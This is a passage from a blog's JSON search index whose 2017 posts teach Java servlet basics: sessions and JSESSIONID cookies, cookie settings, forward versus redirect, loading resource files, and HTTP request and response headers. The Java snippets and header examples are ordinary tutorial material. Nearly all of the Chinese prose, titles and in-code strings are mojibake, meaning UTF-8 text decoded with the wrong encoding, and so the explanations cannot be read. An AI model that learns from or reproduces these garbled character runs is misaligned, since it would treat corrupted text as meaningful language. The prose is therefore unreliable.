response.addCookie(cookie); 3)ç¬¬äºŒæ¬¡è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨å¸¦ç€JESSIONIDçš„cookieè®¿é—®æœåŠ¡å™¨ 4)æœåŠ¡å™¨å¾—åˆ°JSESSIONIDï¼Œåœ¨æœåŠ¡å™¨çš„å†…å­˜ä¸­æœç´¢æ˜¯å¦å­˜æ”¾å¯¹åº”ç¼–å·çš„sessionå¯¹è±¡ã€‚ if(æ‰¾åˆ°){ return map.get(sessionID); } Map&lt;String,HttpSession&gt; 5)å¦‚æœæ‰¾åˆ°å¯¹åº”ç¼–å·çš„sessionå¯¹è±¡ï¼Œç›´æ¥è¿”å›è¯¥å¯¹è±¡ 6ï¼‰å¦‚æœæ‰¾ä¸åˆ°å¯¹åº”ç¼–å·çš„sessionå¯¹è±¡ï¼Œåˆ›å»ºæ–°çš„sessionå¯¹è±¡ï¼Œç»§ç»­èµ°1çš„æµç¨‹ ç»“è®ºï¼šé€šè¿‡JSEESIONIDçš„cookieå€¼åœ¨æœåŠ¡å™¨æ‰¾sessionå¯¹è±¡ï¼ï¼ï¼ï¼ */Sessionç»†èŠ‚ 1)java.lang.String getId() :å¾—åˆ°sessionç¼–å· 2ï¼‰ä¸¤ä¸ªgetSessionæ–¹æ³•ï¼š getSession(true)/getSession() : åˆ›å»ºæˆ–å¾—åˆ°sessionå¯¹è±¡ã€‚æ²¡æœ‰åŒ¹é…çš„sessionç¼–å·ï¼Œåˆ›å»ºæ–°çš„sessionå¯¹è±¡ã€‚ 3)void setMaxInactiveInterval(int interval):è®¾ç½®sessionçš„æœ‰æ•ˆæ—¶é—´ sessionå¯¹è±¡é”€æ¯æ—¶é—´ï¼š 3.1é»˜è®¤æƒ…å†µ30åˆ†æœåŠ¡å™¨è‡ªåŠ¨å›æ”¶ 3.2ä¿®æ”¹sessionå›æ”¶æ—¶é—´ 3.3å…¨å±€ä¿®æ”¹sessionæœ‰æ•ˆæ—¶é—´ &lt;!--ä¿®æ”¹sessionå…¨å±€æœ‰æ•ˆæ—¶é—´ï¼šåˆ†é’Ÿ--&gt; &lt;session-config&gt; &lt;session-timeout&gt;1&lt;/session-timeout&gt; &lt;/session-config&gt; 3.4æ‰‹åŠ¨é”€æ¯sessionå¯¹è±¡ void invalidate() :é”€æ¯sessionå¯¹è±¡ 4ï¼‰å¦‚ä½•é¿å…æµè§ˆå™¨çš„JSESSIONIDçš„cookieéšç€æµè§ˆå™¨å…³é—­è€Œä¸¢å¤±çš„é—®é¢˜ Cookie c = new Cookie(&quot;JSESSIONID&quot;,session.getID()); c.setMaxAge(60*60); response.addCookie(c);","categories":[],"tags":[{"name":"session","slug":"session","permalink":"http://yoursite.com/tags/session/"}]},{"title":"cookie","slug":"cookie","date":"2017-12-08T02:39:23.000Z","updated":"2020-11-14T17:11:34.771Z","comments":true,"path":"2017/12/08/cookie/","link":"","permalink":"http://yoursite.com/2017/12/08/cookie/","excerpt":"","text":"ä¼šè¯æŠ€æœ¯CookieæŠ€æœ¯ï¼šä¼šè¯æ•°æ®ä¿å­˜åœ¨æµè§ˆå™¨å®¢æˆ·ç«¯SessionæŠ€æœ¯ï¼šä¼šè¯æ•°æ®ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯ Cookieç±»ï¼šç”¨äºå­˜å‚¨ä¼šè¯æ•°æ®1ï¼‰æ„é€ Cookieå¯¹è±¡Cookie(java.lang.String name,java.lang.String value)2)è®¾ç½®cookievoid setPathï¼ˆjava.lang.String uriï¼‰:è®¾ç½®cookieçš„æœ‰æ•ˆè®¿é—®è·¯å¾„void setMaxAge(int expiry)ï¼šè®¾ç½®cookieçš„æœ‰æ•ˆæ—¶é—´void setValueï¼ˆjava.lang.String newValue newValueï¼‰:è®¾ç½®cookieçš„å€¼3ï¼‰å‘é€cookieåˆ°æµè§ˆå™¨ä¿å­˜void response.addCookie(Cookie cookie):å‘é€cookie4ï¼‰æœåŠ¡æ¥æ”¶cookieCookie[] request.getCookies():æ¥æ”¶cookie 3.3CookieåŸç†1ï¼‰æœåŠ¡å™¨åˆ›å»ºcookieå¯¹è±¡ï¼ŒæŠŠä¼šè¯æ•°æ®å­˜å‚¨åˆ°cookieå¯¹è±¡ä¸­new Cookie(â€œnameâ€,â€valueâ€);2ï¼‰æœåŠ¡å™¨å‘é€cookieä¿¡æ¯åˆ°æµè§ˆå™¨response.add(cookie);ä¸¾ä¾‹ï¼šset-cookieï¼šname=ericï¼ˆéšè—å‘é€äº†ä¸€ä¸ªset-cookieåç§°çš„å“åº”å¤´ï¼‰3)æµè§ˆå™¨å¾—åˆ°æœåŠ¡å™¨å‘é€çš„cookieï¼Œç„¶åä¿å­˜åœ¨æµè§ˆå™¨ç«¯4ï¼‰æµè§ˆå™¨åœ¨ä¸‹æ¬¡è®¿é—®æœåŠ¡å™¨æ—¶ï¼Œä¼šå¸¦ç€cookieä¿¡æ¯ä¸¾ä¾‹ï¼šcookieï¼šname=ericï¼ˆéšè—å¸¦ç€ä¸€ä¸ªå«cookieåç§°çš„è¯·æ±‚å¤´ï¼‰5ï¼‰æœåŠ¡å™¨æ¥æ”¶åˆ°æ¥è‡ªæµè§ˆå™¨å¸¦æ¥çš„cookieä¿¡æ¯request.getCookies(); 3.4Cookieçš„ç»†èŠ‚1ï¼‰void setPath(java.lang.Stringuri):è®¾ç½®cookieçš„æœ‰æ•ˆè®¿é—®è·¯å¾„ã€‚æœ‰æ•ˆè·¯å¾„æŒ‡çš„æ˜¯cookieçš„æœ‰æ•ˆè·¯å¾„ä¿å­˜åœ¨å“ªé‡Œï¼Œé‚£ä¹ˆæµè§ˆå™¨åœ¨æœ‰æ•ˆè·¯å¾„ä¸‹è®¿é—®å°±ä¼šå¸¦ç€cookieä¿¡æ¯ï¼Œå¦åˆ™ä¸å¸¦cookieä¿¡æ¯2ï¼‰void setMaxAge(int expiry):è®¾ç½®cookieçš„æœ‰æ•ˆæ—¶é—´æ­£æ•´æ•°ï¼šè¡¨ç¤ºcookieæ•°æ®ä¿å­˜åœ¨æµè§ˆå™¨çš„ç¼“å­˜ç›®å½•ä¸­ï¼ˆç¡¬ç›˜ï¼‰ï¼Œæ•°å€¼è¡¨ç¤ºä¿å­˜æ—¶é—´ï¼ˆç§’ä¸ºå•ä½ï¼‰è´Ÿæ•´æ•°ï¼šå…³é—­æµè§ˆå™¨cookieä¸¢å¤±é›¶ï¼šè¡¨ç¤ºåˆ é™¤åŒåçš„cookieæ•°æ®3ï¼‰cookieæ•°æ®ç±»å‹åªèƒ½ä¿å­˜éä¸­æ–‡å­—ç¬¦ä¸²ç±»å‹çš„ã€‚å¯ä»¥ä¿å­˜å¤šä¸ªcookieï¼Œä½†æ˜¯æµè§ˆå™¨ä¸€èˆ¬åªå…è®¸å­˜æ”¾300ä¸ªcookieï¼Œæ¯ä¸ªç«™ç‚¹æœ€å¤šå­˜æ”¾20ä¸ªcookieï¼Œæ¯ä¸ªcookieçš„å¤§å°é™åˆ¶4kbã€‚è€Œä¸”ä¸å¯ä»¥å‡ºç°asciiï¼ˆ44,32ï¼‰çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ç©ºæ ¼å’Œé€—å· ,","categories":[],"tags":[]},{"title":"webåº”ç”¨ä¸­è·¯å¾„é—®é¢˜ä»¥åŠè¯»å–webåº”ç”¨ä¸‹èµ„æºæ–‡ä»¶","slug":"webåº”ç”¨ä¸­è·¯å¾„é—®é¢˜ä»¥åŠè¯»å–webåº”ç”¨ä¸‹èµ„æºæ–‡ä»¶","date":"2017-12-08T02:13:03.000Z","updated":"2020-11-14T17:11:35.318Z","comments":true,"path":"2017/12/08/webåº”ç”¨ä¸­è·¯å¾„é—®é¢˜ä»¥åŠè¯»å–webåº”ç”¨ä¸‹èµ„æºæ–‡ä»¶/","link":"","permalink":"http://yoursite.com/2017/12/08/web%E5%BA%94%E7%94%A8%E4%B8%AD%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98%E4%BB%A5%E5%8F%8A%E8%AF%BB%E5%8F%96web%E5%BA%94%E7%94%A8%E4%B8%8B%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6/","excerpt":"","text":"*webåº”ç”¨ä¸­è·¯å¾„é—®é¢˜ * /** ç›®æ ‡èµ„æºï¼štarget.html æ€è€ƒï¼šç›®æ ‡èµ„æºæ˜¯ç»™è°ç”¨çš„ ç»™æœåŠ¡å™¨ä½¿ç”¨çš„ï¼š/è¡¨ç¤ºåœ¨å½“å‰webåº”ç”¨çš„æ ¹ç›®å½• ç»™æµè§ˆå™¨ä½¿ç”¨çš„ï¼š/è¡¨ç¤ºåœ¨webappsçš„æ ¹ç›®å½•ä¸‹ */ä»£ç ç‰‡ public class PathDemo extends HttpServlet { public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(&quot;text/html;charset=utf-8&quot;); //ç›®æ ‡èµ„æºï¼š target.html /** * æ€è€ƒï¼š ç›®æ ‡èµ„æºæ˜¯ç»™è°ä½¿ç”¨çš„ã€‚ * ç»™æœåŠ¡å™¨ä½¿ç”¨çš„ï¼š / è¡¨ç¤ºåœ¨å½“å‰webåº”ç”¨çš„æ ¹ç›®å½•ï¼ˆwebRootä¸‹ï¼‰ * ç»™æµè§ˆå™¨ä½¿ç”¨çš„ï¼š / è¡¨ç¤ºåœ¨webappsçš„æ ¹ç›®å½•ä¸‹ */ /** * 1.è½¬å‘ */ //request.getRequestDispatcher(&quot;/target.html&quot;).forward(request, response); /** * 2.è¯·æ±‚é‡å®šå‘ */ //response.sendRedirect(&quot;/day11/target.html&quot;); /** * 3.htmlé¡µé¢çš„è¶…è¿æ¥href */ response.getWriter().write(&quot;&lt;html&gt;&lt;body&gt;&lt;a href=&apos;/day11/target.html&apos;&gt;è¶…é“¾æ¥&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;); /** * 4.htmlé¡µé¢ä¸­çš„formæäº¤åœ°å€ */ response.getWriter().write(&quot;&lt;html&gt;&lt;body&gt;&lt;form action=&apos;/day11/target.html&apos;&gt;&lt;input type=&apos;submit&apos;/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&quot;); } }è½¬å‘å’Œè¯·æ±‚é‡å®šå‘çš„åŒºåˆ« /** 1ï¼‰è½¬å‘ a)åœ°å€æ ä¸ä¼šæ”¹å˜ b)è½¬å‘åªèƒ½è½¬åˆ°å½“å‰webåº”ç”¨å†…çš„èµ„æº c)å¯ä»¥åœ¨è½¬å‘è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥æŠŠæ•°æ®ä¿å­˜åˆ°request 2)è¯·æ±‚é‡å®šå‘ a)åœ°å€æ ä¼šæ”¹å˜ï¼Œå˜æˆé‡å®šå‘çš„åœ°å€ b)é‡å®šå‘å¯ä»¥è·³è½¬åˆ°å½“å‰webåº”ç”¨ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–webåº”ç”¨ï¼Œä¹Ÿå¯ä»¥æ˜¯å¤–éƒ¨åŸŸåç½‘ç«™ cï¼‰ä¸èƒ½åœ¨é‡å®šå‘çš„è¿‡ç¨‹ï¼ŒæŠŠæ•°æ®ä¿å­˜åˆ°requestä¸­ //ç»“è®ºï¼šå¦‚æœè¦ä½¿ç”¨requeståŸŸå¯¹è±¡è¿›è¡Œæ•°æ®å…±äº«ï¼Œåªèƒ½ç”¨è½¬å‘æŠ€æœ¯ */è¯»å–webåº”ç”¨ä¸‹çš„èµ„æºæ–‡ä»¶ /** è¯»å–æ–‡ä»¶ã€‚åœ¨webé¡¹ç›®ä¸‹ä¸è¦è¿™æ ·è¯»å–ã€‚å› ä¸º.è¡¨ç¤ºåœ¨tomcat/binç›®å½•ä¸‹ File file = new File(&quot;./src/db.properties&quot;); FileInputStream in = new FileInputStream(file); */ //ä½¿ç”¨webåº”ç”¨ä¸‹åŠ è½½èµ„æºæ–‡ä»¶çš„æ–¹æ³• /** 1.getRealPathè¯»å–ï¼Œè¿”å›èµ„æºæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ */ /** String path = this.getServletContext().getRealPath(&quot;/WEB-INF/classes/db.properties&quot;); File file = new File(path); FileInputStream in = new FileInputStream(file); */ /** 2.getResourceAsStream()å¾—åˆ°èµ„æºæ–‡ä»¶ï¼Œè¿”å›çš„æ˜¯è¾“å…¥æµ */ InputStream in = this.getServletContext().getResourceAsStream(&quot;/WEB-INF/classes/db.properties&quot;); Properties prop = new Properties(); //è¯»å–èµ„æºæ–‡ä»¶ prop.load(in); String user = prop.getProperty(&quot;user&quot;); String password = prop.getProperty(&quot;password&quot;); System.out.println(&quot;user:&quot;+user+&quot;password:&quot;+password);","categories":[],"tags":[]},{"title":"httpåè®®-response","slug":"httpåè®®-response","date":"2017-11-27T12:36:40.000Z","updated":"2020-11-14T17:11:35.789Z","comments":true,"path":"2017/11/27/httpåè®®-response/","link":"","permalink":"http://yoursite.com/2017/11/27/http%E5%8D%8F%E8%AE%AE-response/","excerpt":"","text":"HTTP/1.1 200 OK --å“åº”è¡Œ Server: Apache-Coyote/1.1 --å“åº”å¤´ï¼ˆkey-vauleï¼‰ Content-Length: 24 Date: Fri, 30 Jan 2015 01:54:57 GMT --ä¸€ä¸ªç©ºè¡Œ this is hello servlet!!! --å®ä½“å†…å®¹ çŠ¶æ€ç  200 è¯·æ±‚å·²æˆåŠŸï¼Œè¯·æ±‚æ‰€å¸Œæœ›çš„å“åº”å¤´æˆ–æ•°æ®ä½“å°†éšæ­¤å“åº”è¿”å›ã€‚ 302 è¯·æ±‚é‡å®šå‘ 404 å®¢æˆ·è®¿é—®çš„èµ„æºæ‰¾ä¸åˆ° 500 è¡¨ç¤ºæœåŠ¡å™¨çš„èµ„æºå‘é€é”™è¯¯ï¼ˆæœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼‰å¸¸è§çš„å“åº”å¤´ Location: http://www.it315.org/index.jsp -è¡¨ç¤ºé‡å®šå‘çš„åœ°å€ï¼Œè¯¥å¤´å’Œ302çš„çŠ¶æ€ç ä¸€èµ·ä½¿ç”¨ã€‚ Server:apache tomcat ---è¡¨ç¤ºæœåŠ¡å™¨çš„ç±»å‹ Content-Encoding: gzip -- è¡¨ç¤ºæœåŠ¡å™¨å‘é€ç»™æµè§ˆå™¨çš„æ•°æ®å‹ç¼©ç±»å‹ Content-Length: 80 --è¡¨ç¤ºæœåŠ¡å™¨å‘é€ç»™æµè§ˆå™¨çš„æ•°æ®é•¿åº¦ Content-Language: zh-cn --è¡¨ç¤ºæœåŠ¡å™¨æ”¯æŒçš„è¯­è¨€ Content-Type: text/html; charset=GB2312 --è¡¨ç¤ºæœåŠ¡å™¨å‘é€ç»™æµè§ˆå™¨çš„æ•°æ®ç±»å‹åŠå†…å®¹ç¼–ç  Last-Modified: Tue, 11 Jul 2000 18:23:51 GMT --è¡¨ç¤ºæœåŠ¡å™¨èµ„æºçš„æœ€åä¿®æ”¹æ—¶é—´ Refresh: 1;url=http://www.it315.org --è¡¨ç¤ºå®šæ—¶åˆ·æ–° Content-Disposition: attachment; filename=aaa.zip --è¡¨ç¤ºå‘Šè¯‰æµè§ˆå™¨ä»¥ä¸‹è½½æ–¹å¼æ‰“å¼€èµ„æºï¼ˆä¸‹è½½æ–‡ä»¶æ—¶ç”¨åˆ°ï¼‰ Transfer-Encoding: chunked Set-Cookie:SS=Q0=5Lb_nQ; path=/search --è¡¨ç¤ºæœåŠ¡å™¨å‘é€ç»™æµè§ˆå™¨çš„cookieä¿¡æ¯ï¼ˆä¼šè¯ç®¡ç†ç”¨åˆ°ï¼‰ Expires: -1 --è¡¨ç¤ºé€šçŸ¥æµè§ˆå™¨ä¸è¿›è¡Œç¼“å­˜ Cache-Control: no-cache Pragma: no-cache Connection: close/Keep-Alive --è¡¨ç¤ºæœåŠ¡å™¨å’Œæµè§ˆå™¨çš„è¿æ¥çŠ¶æ€ã€‚closeï¼šå…³é—­è¿æ¥ keep-alive:ä¿å­˜è¿æ¥HttpServletResponseå¯¹è±¡ å“åº”è¡Œï¼š response.setStatus() è®¾ç½®çŠ¶æ€ç  å“åº”å¤´ï¼š response.setHeader(&quot;name&quot;,&quot;value&quot;); å®ä½“å†…å®¹ï¼šï¼ˆå®¢æˆ·å¯ä»¥çœ‹è§çš„ï¼‰ response.getWriter().writer();//å‘é€å­—ç¬¦å®ä½“å†…å®¹ protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { /** * 3ï¼‰é€šè¿‡responseå¯¹è±¡æ”¹å˜å“åº”ä¿¡æ¯ * */ /** * 3.1å“åº”è¡Œ * * */ //ä¿®æ”¹çŠ¶æ€ç  //response.setStatus(404);//ä¿®æ”¹çŠ¶æ€ç  //response.sendError(404);//å‘é€çŠ¶æ€ç è¿˜æœ‰é”™è¯¯é¡µé¢ /** * 3.2å“åº”å¤´ * */ response.setHeader(&quot;server&quot;,&quot;JBoss&quot;); /** * 3.3å®ä½“å†…å®¹ï¼ˆæµè§ˆå™¨ç›´æ¥å¯ä»¥çœ‹åˆ°çš„å†…å®¹ï¼‰ * */ response.getWriter().write(&quot;01.hello world&quot;); }è¯·æ±‚é‡å®šå‘ @WebServlet(name = &quot;ResponseDemo2&quot;,urlPatterns = &quot;/ResponseDemo2&quot;) public class ResponseDemo2 extends HttpServlet { /** * éœ€æ±‚ï¼šè·³è½¬åˆ°advã€‚html * ä½¿ç”¨è¯·æ±‚é‡å®šå‘ï¼šå‘é€ä¸€ä¸ª302çŠ¶æ€ç +locationçš„å“åº”å¤´ * * */ /** * è¯·æ±‚é‡å®šå‘æµè§ˆå™¨ä¸€å…±æƒ³æœåŠ¡å™¨å‘é€ä¸¤æ¬¡è¯·æ±‚ï¼Œç¬¬ä¸€æ¬¡æ˜¯ResponseDemo1ï¼Œç¬¬äºŒæ¬¡æ˜¯advã€‚html * æœåŠ¡å™¨ä¹Ÿæ˜¯è¿”å›ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡æ˜¯status302ï¼Œlocationã€‚adv.html,ç¬¬äºŒæ¬¡æ˜¯advã€‚html * */ protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // response.setStatus(302); // response.setHeader(&quot;location&quot;,&quot;/some/adv.html&quot;); //è¯·æ±‚é‡å®šå‘ç®€åŒ–å†™æ³• response.sendRedirect(&quot;/some/adv.html&quot;); } }å®šæ—¶åˆ·æ–°å’Œéš”nç§’è·³è½¬åˆ°å¦å¤–é¡µé¢ //å®šæ—¶åˆ·æ–° response.setHeader(&quot;refresh&quot;,&quot;1&quot;); /** éš”nç§’è·³è½¬åˆ°å…¶ä»–é¡µé¢ */ response.setHeader(&quot;refresh&quot;,&quot;3;url=/some/adv.html&quot;)//éš”ä¸‰ç§’ï¼Œè·³è½¬åˆ°adv.htmlcontent-Typeä½œç”¨ @WebServlet(name = &quot;ResponseDemo4&quot;,urlPatterns = &quot;/ResponseDemo4&quot;) public class ResponseDemo4 extends HttpServlet { protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { /** *1.æœåŠ¡å™¨å‘é€ç»™æµè§ˆå™¨çš„æ•°æ®ç±»å‹ * */ response.setContentType(&quot;text/html;charset=utf-8&quot;); // response.setContentType(&quot;text/html&quot;); //è®¾ç½®å“åº”å®ä½“å†…å®¹ç¼–ç  // response.setCharacterEncoding(&quot;utf-8&quot;); //response.setHeader(&quot;content-type&quot;,&quot;text/html&quot;);//å’Œä¸Šé¢çš„ä»£ç ç­‰ä»· //response.setContentType(&quot;text/xml&quot;); response.getWriter().write(&quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;ä¸­å›½&lt;/body&gt;&lt;/html&gt;&quot;); //File file = new File(&quot;e:gakki.jpg&quot;); /** * è®¾ç½®ä»¥ä¸‹è½½æ–¹å¼æ‰“å¼€æ–‡ä»¶ * * */ //response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename&quot; + file.getName()); /** * ä¸‹è½½å›¾ç‰‡ * */ /** * å‘é€å›¾ç‰‡ * */ // response.setContentType(&quot;image/jpg&quot;); // FileInputStream in = new FileInputStream(file); // byte[] buf = new byte[1024]; // int len = 0; // //æŠŠå›¾ç‰‡å†™åˆ°æµè§ˆå™¨ // while((len = in.read(buf))!=-1){ // response.getOutputStream().write(buf,0,len); // } // } } }å®Œç¾è§£å†³é¡¹ç›®ç¼–ç é—®é¢˜ /** åœ¨æ¯ä¸ªservletå¼€å¤´å†™ï¼š */ request.setCharacterEncoding(&quot;utf-8&quot;); response.setContentType(&quot;text/html;charset=utf-8&quot;);","categories":[],"tags":[]},{"title":"httpåè®®-request","slug":"httpåè®®-request","date":"2017-11-21T12:54:54.000Z","updated":"2020-11-14T17:11:36.276Z","comments":true,"path":"2017/11/21/httpåè®®-request/","link":"","permalink":"http://yoursite.com/2017/11/21/http%E5%8D%8F%E8%AE%AE-request/","excerpt":"","text":"httpåè®®å†…å®¹ è¯·æ±‚ï¼ˆæµè§ˆå™¨-ã€‹æœåŠ¡å™¨ï¼‰ Request GET /day09/hello HTTP/1.1--è¯·æ±‚è¡Œ Host: localhost:8080---è¯·æ±‚å¤´ï¼ˆå¤šä¸ªkey-valueå¯¹è±¡ï¼‰ User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-cn,en-us;q=0.8,zh;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive ---ä¸€ä¸ªç©ºè¡Œ name=husky&amp;password=adios ----(å¯é€‰)å®ä½“å†…å®¹ï¼ˆåªæœ‰postæäº¤çš„å‚æ•°ä¼šæ”¾åˆ°å®ä½“å†…å®¹ä¸­ï¼‰ï¼‰ å“åº”ï¼ˆæœåŠ¡å™¨-ã€‹æµè§ˆå™¨ï¼‰Response HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Length: 24 Date: Fri, 30 Jan 2015 01:54:57 GMT this is hello servlet!!!httpåè®®ç‰ˆæœ¬ http1.0: å½“å‰æµè§ˆå™¨å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥åï¼Œåªèƒ½å‘é€ä¸€æ¬¡è¯·æ±‚ï¼Œ ä¸€æ¬¡è¯·æ±‚ä¹‹åè¿æ¥å…³é—­ http1.1:å½“å‰æµè§ˆå™¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å»ºç«‹è¿æ¥ä¹‹åï¼Œå¯ä»¥åœ¨ä¸€æ¬¡è¿æ¥ä¸­å‘é€å¤šæ¬¡è¯·æ±‚ã€‚ï¼ˆåŸºæœ¬ä¸Šéƒ½ä½¿ç”¨1.1ç‰ˆæœ¬ï¼‰è¯·æ±‚æ–¹å¼ å¸¸è§è¯·æ±‚æ–¹å¼ï¼šGETå’ŒPOST 1ï¼‰GETæ–¹å¼æäº¤ a)åœ°å€æ ï¼ˆurlï¼‰ä¼šè·Ÿä¸Šå‚æ•°æ•°æ®ã€‚ä»¥ï¼Ÿå¼€å¤´ï¼Œå¤šä¸ªå‚æ•°ä»¥&amp;åˆ†å‰² GET /day09/testMethod.html?name=eric&amp;password=123456 HTTP/1.1 b)GETæäº¤å‚æ•°æ•°æ®æœ‰é™åˆ¶ï¼Œä¸è¶…è¿‡1kb c)GETæ–¹å¼ä¸é€‚åˆæäº¤æ•æ„Ÿå¯†ç ã€‚ d)æ³¨æ„ï¼šæµè§ˆå™¨ç›´æ¥è®¿é—®çš„è¯·æ±‚ï¼Œé»˜è®¤æäº¤æ–¹å¼æ˜¯GETæ–¹å¼ã€‚ 2ï¼‰POSTæ–¹å¼æäº¤ a)å‚æ•°ä¸ä¼šè·Ÿåœ¨URIåé¢ã€‚å‚æ•°è€Œæ˜¯è·Ÿåœ¨è¯·æ±‚çš„å®ä½“å†…å®¹ä¸­ã€‚æ²¡æœ‰ï¼Ÿå¼€å¤´ï¼Œè€Œæ˜¯ä»¥&amp;è¿æ¥ name=eric&amp;password=123456 b)postæäº¤çš„å‚æ•°æ•°æ®æ²¡æœ‰é™åˆ¶ã€‚ c)postæ–¹å¼æäº¤é“­æ„Ÿæ•°æ®è¯·æ±‚å¤´ Accept: text/html,image/* -- æµè§ˆå™¨æ¥å—çš„æ•°æ®ç±»å‹ Accept-Charset: ISO-8859-1 -- æµè§ˆå™¨æ¥å—çš„ç¼–ç æ ¼å¼ Accept-Encoding: gzip,compress --æµè§ˆå™¨æ¥å—çš„æ•°æ®å‹ç¼©æ ¼å¼ Accept-Language: en-us,zh- --æµè§ˆå™¨æ¥å—çš„è¯­è¨€ Host: www.it315.org:80 --ï¼ˆå¿…é¡»çš„ï¼‰å½“å‰è¯·æ±‚è®¿é—®çš„ç›®æ ‡åœ°å€ï¼ˆä¸»æœº:ç«¯å£ï¼‰ If-Modified-Since: Tue, 11 Jul 2000 18:23:51 GMT --æµè§ˆå™¨æœ€åçš„ç¼“å­˜æ—¶é—´ Referer: http://www.it315.org/index.jsp -- å½“å‰è¯·æ±‚æ¥è‡ªäºå“ªé‡Œ User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0) --æµè§ˆå™¨ç±»å‹ Cookie:name=eric -- æµè§ˆå™¨ä¿å­˜çš„cookieä¿¡æ¯ Connection: close/Keep-Alive -- æµè§ˆå™¨è·ŸæœåŠ¡å™¨è¿æ¥çŠ¶æ€ã€‚close: è¿æ¥å…³é—­ keep-aliveï¼šä¿å­˜è¿æ¥ã€‚ Date: Tue, 11 Jul 2000 18:23:51 GMT -- è¯·æ±‚å‘å‡ºçš„æ—¶é—´é€šè¿‡servletè·å¾—æµè§ˆå™¨å‘è¿‡æ¥çš„è¯·æ±‚æ•°æ®RequestDemo2.java package com.husky.javaweb; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.InputStream; import java.util.Enumeration; @WebServlet(name = &quot;RequestDemo2&quot;,urlPatterns = &quot;/RequestDemo2&quot;) public class RequestDemo2 extends HttpServlet { //ä¸ºäº†æ¥æ”¶POSTæ–¹å¼æäº¤çš„è¯·æ±‚ protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { t3(request); } /** * 1)tomcatæœåŠ¡å™¨æ¥å—åˆ°æµè§ˆå™¨å‘é€çš„è¯·æ±‚æ•°æ®ï¼Œç„¶åå°è£…åˆ°HttpServletRequestå¯¹è±¡ä¸­ * 2ï¼‰tomcatæœåŠ¡å™¨è°ƒç”¨doGetæ–¹æ³•ï¼Œç„¶åæŠŠrequestå¯¹è±¡ä¼ å…¥åˆ°servletä¸­ã€‚ * * */ protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { /** * 3ï¼‰ä»requestå¯¹è±¡å–å‡ºè¯·æ±‚æ•°æ® * */ /** * 3.1è¯·æ±‚è¡Œ æ ¼å¼ï¼šï¼ˆGET /hello http1.1ï¼‰ * */ //t1(request); /** * 3.2è¯·æ±‚å¤´ * */ //t2(request); /** * 3.3è¯·æ±‚çš„å®ä½“å†…å®¹ * åœ¨doPostä¸­å®ç° * */ } private void t3(HttpServletRequest request) throws IOException { InputStream in = request.getInputStream(); byte[] buf = new byte[1024]; int len = 0; while((len = in.read(buf))!= -1){ String str = new String(buf,0,len); System.out.println(str); } } private void t2(HttpServletRequest request) { String host = request.getHeader(&quot;Host&quot;); System.out.println(host); //å˜é‡ Enumeration&lt;String&gt; enums = request.getHeaderNames(); while(enums.hasMoreElements()){ String headerName = enums.nextElement(); String headerValue = request.getHeader(headerName); System.out.println(headerName + &quot; : &quot;+headerValue); } } private void t1(HttpServletRequest request) { System.out.println(&quot;è¯·æ±‚æ–¹å¼: &quot;+request.getMethod()); System.out.println(&quot;URI: &quot;+request.getRequestURI()); System.out.println(&quot;URL: &quot;+request.getRequestURL()); System.out.println(&quot;httpåè®®ç‰ˆæœ¬ï¼š&quot;+request.getProtocol()); } }","categories":[],"tags":[{"name":"httpåè®®","slug":"httpåè®®","permalink":"http://yoursite.com/tags/http%E5%8D%8F%E8%AE%AE/"}]},{"title":"é…ç½®ç¬¬ä¸€ä¸ªservlet","slug":"é…ç½®ç¬¬ä¸€ä¸ªservlet","date":"2017-11-20T09:25:27.000Z","updated":"2020-11-14T17:11:36.784Z","comments":true,"path":"2017/11/20/é…ç½®ç¬¬ä¸€ä¸ªservlet/","link":"","permalink":"http://yoursite.com/2017/11/20/%E9%85%8D%E7%BD%AE%E7%AC%AC%E4%B8%80%E4%B8%AAservlet/","excerpt":"","text":"//é¦–å…ˆå†™ä¸€ä¸ªHelloServlet.java,é€šè¿‡ç¼–è¯‘åï¼Œå¾—åˆ°ä¸€ä¸ªHelloServlet.class //ä¸‹é¢æ˜¯HelloServlet.javaæºä»£ç  package com.husky.sever; import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.util.Date; public class HelloServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { //è§£å†³ä¸­æ–‡ä¹±ç  response.setContentType(&quot;text/html;charset=utf-8&quot;); //å‘æµè§ˆå™¨è¾“å‡ºå†…å®¹ response.getWriter().write(&quot;è¿™æ˜¯ä¸€ä¸ªservletç¨‹åºï¼Œå½“å‰æ—¶é—´ä¸ºï¼š&quot;+ new Date()); } } //é…ç½®tomcatæœåŠ¡å™¨é‡Œé¢çš„æ–‡ä»¶ 